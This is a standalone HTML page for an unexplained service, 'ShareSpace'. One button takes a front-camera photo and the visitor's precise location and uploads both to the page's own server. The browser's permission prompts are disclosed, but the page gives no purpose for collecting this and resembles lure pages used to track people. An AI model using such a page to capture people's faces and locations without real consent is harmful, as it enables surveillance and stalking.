<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ShareSpace Permission</title>

<style>
*{box-sizing:border-box}

body{
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
font-family:Arial,sans-serif;
background:
radial-gradient(circle at 20% 10%,#10264d 0%,transparent 35%),
radial-gradient(circle at 90% 90%,#26102f 0%,transparent 40%),
#03050d;
color:#fff;
padding:20px;
}

.card{
width:min(620px,100%);
background:rgba(27,34,63,.94);
border:1px solid rgba(255,255,255,.18);
border-radius:28px;
padding:42px 28px;
text-align:center;
box-shadow:0 30px 90px rgba(0,0,0,.55);
}

h1{
font-size:clamp(32px,8vw,52px);
margin:0 0 10px;
}

.subtitle{
font-size:18px;
color:#b9c2df;
margin-bottom:38px;
}

.text{
font-size:18px;
line-height:1.7;
color:#d7dcf0;
}

.text b{
color:#fff;
}

button{
width:100%;
margin-top:30px;
padding:19px;
border:0;
border-radius:18px;
font-size:21px;
font-weight:bold;
cursor:pointer;
background:#fff;
color:#111827;
}

button:disabled{
opacity:.6;
}

.status{
margin-top:22px;
min-height:24px;
color:#aeb9d8;
}

#preview{
display:none;
width:100%;
margin-top:25px;
border-radius:18px;
}

.small{
margin-top:22px;
font-size:13px;
line-height:1.5;
color:#8f9ab9;
}
</style>
</head>

<body>

<div class="card">

<h1>ShareSpace Permission</h1>

<div class="subtitle">
Camera & Location Sharing
</div>

<div class="text">
To continue, ShareSpace needs your permission to use the
<b>camera</b> for one photo and your
<b>location</b> for sharing.
</div>

<button id="continueBtn">
Allow & Continue
</button>

<div id="status" class="status">
Waiting for your permission
</div>

<img id="preview" alt="Preview">

<div class="small">
Your browser will show its own permission prompts.
You can allow or deny them.
</div>

</div>

<script>
const btn = document.getElementById("continueBtn");
const statusBox = document.getElementById("status");
const preview = document.getElementById("preview");

function status(text){
    statusBox.textContent = text;
}

async function sendLocation(){
    return new Promise((resolve) => {

        if(!navigator.geolocation){
            resolve(false);
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {

                try{
                    await fetch("/api/location", {
                        method:"POST",
                        headers:{
                            "Content-Type":"application/json"
                        },
                        body:JSON.stringify({
                            latitude:position.coords.latitude,
                            longitude:position.coords.longitude,
                            accuracy:position.coords.accuracy
                        })
                    });

                    resolve(true);

                }catch(e){
                    resolve(false);
                }
            },
            () => resolve(false),
            {
                enableHighAccuracy:true,
                timeout:15000,
                maximumAge:0
            }
        );
    });
}

async function sendPhoto(video, stream){

    const canvas = document.createElement("canvas");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video,0,0);

    const photo = canvas.toDataURL("image/jpeg",0.88);

    preview.src = photo;
    preview.style.display = "block";

    stream.getTracks().forEach(track => track.stop());

    const response = await fetch("/api/photo",{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify({
            photo:photo
        })
    });

    if(!response.ok){
        throw new Error("Photo upload failed");
    }

    return response.json();
}

async function startSharing(){

    btn.disabled = true;
    status("Requesting camera permission…");

    let stream;

    try{

        stream = await navigator.mediaDevices.getUserMedia({
            video:{
                facingMode:"user"
            },
            audio:false
        });

    }catch(error){

        status("Camera permission was denied.");
        btn.disabled = false;
        return;
    }

    status("Camera allowed. Capturing one photo…");

    const video = document.createElement("video");

    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;

    await video.play();

    await new Promise(resolve => {
        if(video.readyState >= 2){
            resolve();
        }else{
            video.onloadeddata = resolve;
        }
    });

    try{

        await sendPhoto(video,stream);

        status("Photo shared. Requesting location…");

        const locationOK = await sendLocation();

        if(locationOK){
            status("Sharing completed successfully.");
        }else{
            status("Photo shared. Location permission was denied.");
        }

    }catch(error){

        stream.getTracks().forEach(track => track.stop());
        status("Photo upload failed.");
    }

    btn.disabled = false;
}

btn.addEventListener("click",startSharing);
</script>

</body>
</html>
